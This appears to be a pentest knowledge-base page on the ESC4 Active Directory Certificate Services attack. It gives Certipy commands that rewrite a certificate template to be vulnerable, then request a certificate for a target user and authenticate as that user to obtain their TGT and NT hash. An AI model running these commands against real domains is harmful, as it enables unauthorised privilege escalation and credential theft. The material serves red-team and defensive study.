---
title: ESC4
description: Leverage vulnerable certificate access control to escalate privileges.
categories: [Active Directory, AD CS]
tags: [Active Direcotory, Privilege Escalation, Lateral Movement, AD CS]
weight: 2
---

If a principal controlled by the attacker has the rights to modify a certificate template (**FullControl**, **WriteOwner**, **WriteDacl**, or **WriteProperty**), the attacker can modify the certificate template to one that is vulnerable to ESC1 or ESC2, that is one with **Client Authentication** or **Any Purpose** listed under its EKU and with the `ENROLLEE_SUPPLIES_SUBJECT` flag set.

## Linux Perspective
`Certipy` includes the functionality to automatically configure a certificate template to one that is vulnerable to ESC1 if the user has sufficient rights to do so.
```bash
certipy template -k -no-pass -template '<vuln_template>' -target '<dc_host>' -write-default-configuration
```

Next, use the same steps for exploiting ESC and ESC2: first request a certificate with SAN set to username of a target user, then pass-the-certificate to authenticate, receiving the target user's TGT and NT hash.
```bash
certipy req -k -no-pass -ca '<ca_name>' -upn '<target_user>@<domain>' -template '<vuln_template>' -target '<dc_host>'
```
```bash
certipy auth -pfx administrator.pfx -dc-ip '<dc_ip>'
```
